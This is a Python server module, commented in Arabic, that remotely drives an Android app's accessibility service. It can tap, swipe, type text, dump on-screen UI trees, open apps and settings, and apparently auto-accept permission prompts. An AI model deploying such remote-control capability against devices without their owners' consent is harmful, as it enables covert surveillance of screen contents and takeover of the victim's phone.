#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
accessibility.py
============================================================
تنفيذ أوامر Accessibility من جانب السيرفر.

المسؤوليات:
  1. إرسال أوامر التحكم عن بُعد للتطبيق.
  2. انتظار النتيجة (RESULT) من التطبيق.
  3. عرض نتيجة الأوامر للمستخدم.
  4. دعم كل إجراءات AutoPilotService.

الإجراءات المدعومة:
  ── أزرار النظام ──
    HOME, BACK, RECENTS, NOTIFICATIONS, LOCK

  ── التفاعل ──
    CLICK       x y
    LONG_CLICK  x y
    SWIPE       x1 y1 x2 y2 [duration]
    TEXT        <text>
    SCROLL      <direction>
    FIND_CLICK  <text>

  ── القراءة ──
    DUMP_UI      (يرسل شجرة الواجهة كـ EVENT)
    GET_PACKAGE  (يرسل اسم الحزمة الحالية كـ EVENT)

  ── الأتمتة ──
    OPEN_APP        <package>
    OPEN_SETTINGS   [action]
    ALLOW_PERM

يعتمد على:
  - ClientSession (لإرسال الأوامر)
  - asyncio.Future (لانتظار النتائج)

الاستخدام:
  handler = AccessibilityCommand(session_manager)
  result = await handler.execute(client_id, "CLICK", {"x": 540, "y": 960})
============================================================
"""

import asyncio
import logging
import time
from dataclasses import dataclass
from typing import Any, Dict, Optional

from core.client_session import ClientSession
from core.session_manager import SessionManager

logger = logging.getLogger("accessibility")


# ============================================================
# 1. الإعدادات
# ============================================================
# مهلة انتظار النتيجة (ثواني)
DEFAULT_TIMEOUT = 10.0

# إجراءات سريعة (لا تحتاج انتظار طويل)
FAST_ACTIONS = {"HOME", "BACK", "RECENTS", "NOTIFICATIONS", "LOCK"}

# إجراءات بطيئة (تحتاج انتظار أطول)
SLOW_ACTIONS = {"DUMP_UI", "OPEN_APP", "ALLOW_PERM", "SWIPE", "LONG_CLICK"}


# ============================================================
# 2. نموذج النتيجة
# ============================================================
@dataclass
class ActionRequest:
    """طلب إجراء قيد الانتظار."""
    request_id: str
    action: str
    started_at: float
    future: asyncio.Future


# ============================================================
# 3. AccessibilityCommand
# ============================================================
class AccessibilityCommand:
    """
    منفّذ أوامر Accessibility.
    """

    def __init__(self, session_manager: SessionManager):
        self.session_manager = session_manager

        # الطلبات المعلّقة (بانتظار RESULT)
        # {request_id: ActionRequest}
        self._pending: Dict[str, ActionRequest] = {}

        # آخر UI tree مُستلَم (للعرض من CLI)
        # {client_id: dict}
        self._last_ui_tree: Dict[str, Dict[str, Any]] = {}

        # آخر حزمة حالية
        # {client_id: str}
        self._last_package: Dict[str, str] = {}

    # ========================================================
    # 3.1 التنفيذ الرئيسي
    # ========================================================
    async def execute(
        self,
        client_id: str,
        action: str,
        params: Optional[Dict[str, Any]] = None,
        timeout: Optional[float] = None,
    ) -> Dict[str, Any]:
        """
        إرسال أمر Accessibility وانتظار النتيجة.

        :param client_id: معرف العميل
        :param action: الإجراء (مثل "CLICK")
        :param params: المعاملات
        :param timeout: المهلة (تلقائي حسب نوع الإجراء)
        :return: قاموس النتيجة {"success": bool, "message": str}
        """
        session = self.session_manager.get_session(client_id)
        if session is None:
            return {"success": False, "message": f"Client not found: {client_id}"}

        action = (action or "").upper()
        if not action:
            return {"success": False, "message": "Empty action"}

        params = params or {}

        # ----- حساب المهلة -----
        if timeout is None:
            if action in FAST_ACTIONS:
                timeout = 5.0
            elif action in SLOW_ACTIONS:
                timeout = 15.0
            else:
                timeout = DEFAULT_TIMEOUT

        # ----- توليد request_id -----
        request_id = f"acc-{int(time.time() * 1000)}"

        # ----- إنشاء Future -----
        loop = asyncio.get_event_loop()
        future: asyncio.Future = loop.create_future()

        self._pending[request_id] = ActionRequest(
            request_id=request_id,
            action=action,
            started_at=time.time(),
            future=future,
        )

        # ----- تجهيز الأمر -----
        command = {
            "id": request_id,
            "cmd": "ACCESSIBILITY",
            "payload": {
                "action": action,
                **params,
            },
        }

        # ----- إرسال -----
        ok = await session.send_command(command)
        if not ok:
            self._pending.pop(request_id, None)
            return {"success": False, "message": "Failed to send command"}

        logger.info(f"[{client_id}] ACCESS {action} sent ({request_id})")

        # ----- انتظار النتيجة -----
        try:
            result = await asyncio.wait_for(future, timeout=timeout)
            return result
        except asyncio.TimeoutError:
            logger.warning(
                f"[{client_id}] ACCESS {action} timeout ({timeout}s)"
            )
            self._pending.pop(request_id, None)
            return {
                "success": False,
                "message": f"Timeout after {timeout}s",
            }
        except Exception as e:
            logger.exception(f"ACCESS {action} error: {e}")
            self._pending.pop(request_id, None)
            return {"success": False, "message": str(e)}

    # ========================================================
    # 3.2 معالج RESULT الوارد
    # ========================================================
    async def on_result(
        self,
        client_id: str,
        message: Dict[str, Any],
    ) -> bool:
        """
        يُستدعى عند وصول RESULT من التطبيق.

        :return: True إذا تم المطابقة
        """
        request_id = message.get("id")
        if not request_id:
            return False

        req = self._pending.pop(request_id, None)
        if req is None:
            logger.debug(f"No pending action for {request_id}")
            return False

        # ----- استخراج النتيجة -----
        success = bool(message.get("success", False))
        msg_text = message.get("message", "")

        # ----- إشعار المنتظر -----
        if not req.future.done():
            req.future.set_result({
                "success": success,
                "message": msg_text,
                "action": req.action,
                "elapsed": time.time() - req.started_at,
            })

        logger.info(
            f"[{client_id}] RESULT {req.action}: "
            f"{'✅' if success else '❌'} {msg_text}"
        )
        return True

    # ========================================================
    # 3.3 معالج EVENT الوارد (UI_TREE, CURRENT_PACKAGE)
    # ========================================================
    async def on_event(
        self,
        client_id: str,
        message: Dict[str, Any],
    ) -> bool:
        """
        يُستدعى عند وصول EVENT من التطبيق.

        :return: True إذا تم المعالجة
        """
        event = message.get("event", "")
        data = message.get("data", {})

        if event == "UI_TREE":
            self._last_ui_tree[client_id] = data
            logger.info(
                f"[{client_id}] UI tree received "
                f"({len(str(data))} chars)"
            )
            return True

        if event == "CURRENT_PACKAGE":
            pkg = data.get("package", "unknown") if isinstance(data, dict) else str(data)
            self._last_package[client_id] = pkg
            logger.info(f"[{client_id}] Current package: {pkg}")
            return True

        if event == "AUTOPILOT_READY":
            logger.info(f"[{client_id}] AutoPilot ready")
            return True

        logger.debug(f"[{client_id}] Unknown event: {event}")
        return False

    # ========================================================
    # 3.4 دوال مختصرة (Convenience)
    # ========================================================

    # ---------- أزرار النظام ----------
    async def press_home(self, client_id: str) -> Dict[str, Any]:
        return await self.execute(client_id, "HOME")

    async def press_back(self, client_id: str) -> Dict[str, Any]:
        return await self.execute(client_id, "BACK")

    async def press_recents(self, client_id: str) -> Dict[str, Any]:
        return await self.execute(client_id, "RECENTS")

    # ---------- اللمس ----------
    async def click(self, client_id: str, x: float, y: float) -> Dict[str, Any]:
        return await self.execute(client_id, "CLICK", {"x": x, "y": y})

    async def long_click(self, client_id: str, x: float, y: float) -> Dict[str, Any]:
        return await self.execute(client_id, "LONG_CLICK", {"x": x, "y": y})

    async def swipe(
        self,
        client_id: str,
        x1: float, y1: float,
        x2: float, y2: float,
        duration: int = 300,
    ) -> Dict[str, Any]:
        return await self.execute(client_id, "SWIPE", {
            "x1": x1, "y1": y1,
            "x2": x2, "y2": y2,
            "duration": duration,
        })

    # ---------- النص ----------
    async def type_text(self, client_id: str, text: str) -> Dict[str, Any]:
        return await self.execute(client_id, "TEXT", {"text": text})

    async def find_click(self, client_id: str, text: str) -> Dict[str, Any]:
        return await self.execute(client_id, "FIND_CLICK", {"text": text})

    # ---------- التمرير ----------
    async def scroll(self, client_id: str, direction: str = "down") -> Dict[str, Any]:
        return await self.execute(client_id, "SCROLL", {"direction": direction})

    # ---------- القراءة ----------
    async def dump_ui(self, client_id: str) -> Dict[str, Any]:
        """يطلب UI tree (يُخزَّن، ويُقرأ عبر get_last_ui_tree)."""
        return await self.execute(client_id, "DUMP_UI")

    async def get_package(self, client_id: str) -> Dict[str, Any]:
        return await self.execute(client_id, "GET_PACKAGE")

    # ---------- الأتمتة ----------
    async def open_app(self, client_id: str, package: str) -> Dict[str, Any]:
        return await self.execute(client_id, "OPEN_APP", {"package": package})

    async def open_settings(
        self,
        client_id: str,
        action: str = "SETTINGS",
    ) -> Dict[str, Any]:
        return await self.execute(client_id, "OPEN_SETTINGS", {"action": action})

    async def allow_permission(self, client_id: str) -> Dict[str, Any]:
        return await self.execute(client_id, "ALLOW_PERM")

    # ========================================================
    # 3.5 قراءة البيانات المُخزَّنة
    # ========================================================
    def get_last_ui_tree(self, client_id: str) -> Optional[Dict[str, Any]]:
        """آخر UI tree مُستلَم."""
        return self._last_ui_tree.get(client_id)

    def get_last_package(self, client_id: str) -> Optional[str]:
        """آخر حزمة حالية."""
        return self._last_package.get(client_id)

    def clear_cache(self, client_id: str) -> None:
        """مسح الـ cache لعميل."""
        self._last_ui_tree.pop(client_id, None)
        self._last_package.pop(client_id, None)

    # ========================================================
    # 3.6 تنسيق UI Tree للعرض
    # ========================================================
    @staticmethod
    def format_ui_tree(data: Dict[str, Any], max_depth: int = 5) -> str:
        """
        تنسيق UI tree للعرض في الطرفية.
        """
        if not data:
            return "  (لا توجد بيانات)"

        package = data.get("package", "?")
        nodes = data.get("nodes", [])

        lines = [f"📱 {package}", "─" * 60]

        def render_node(node: Dict[str, Any], depth: int = 0, index: int = 0):
            if depth > max_depth:
                return

            prefix = "  " * depth + ("└─ " if depth > 0 else "")
            cls = node.get("class", "?")
            text = node.get("text", "")
            desc = node.get("desc", "")
            clickable = "🖱️" if node.get("clickable") else "  "
            editable = "✏️" if node.get("editable") else "  "
            bounds = node.get("bounds", "")

            # اختصار اسم الكلاس
            short_cls = cls.split(".")[-1] if cls else "?"

            # المحتوى
            content = text or desc or ""
            if content:
                content = f' "{content[:40]}"'

            lines.append(f"{prefix}{clickable}{editable} {short_cls}{content}")

            # الأبناء
            children = node.get("children", [])
            for i, child in enumerate(children):
                render_node(child, depth + 1, i)

        for node in nodes:
            render_node(node)

        return "\n".join(lines)

    # ========================================================
    # 3.7 تنظيف
    # ========================================================
    def cancel_pending(self, client_id: str) -> int:
        """
        إلغاء كل الطلبات المعلّقة لعميل.
        :return: عدد الطلبات المُلغاة
        """
        cancelled = 0
        for rid, req in list(self._pending.items()):
            if not req.future.done():
                req.future.cancel()
                cancelled += 1
            self._pending.pop(rid, None)

        self.clear_cache(client_id)
        logger.info(f"[{client_id}] Cancelled {cancelled} pending actions")
        return cancelled

    def pending_count(self) -> int:
        """عدد الطلبات المعلّقة."""
        return len(self._pending)

    def list_pending(self) -> Dict[str, str]:
        """قائمة الطلبات المعلّقة (id → action)."""
        return {
            rid: req.action
            for rid, req in self._pending.items()
        }


# ============================================================
# 4. Singleton
# ============================================================
_default_handler: Optional[AccessibilityCommand] = None


def get_accessibility_handler(session_manager: SessionManager) -> AccessibilityCommand:
    """إرجاع المعالج (Singleton)."""
    global _default_handler
    if _default_handler is None:
        _default_handler = AccessibilityCommand(session_manager)
    return _default_handler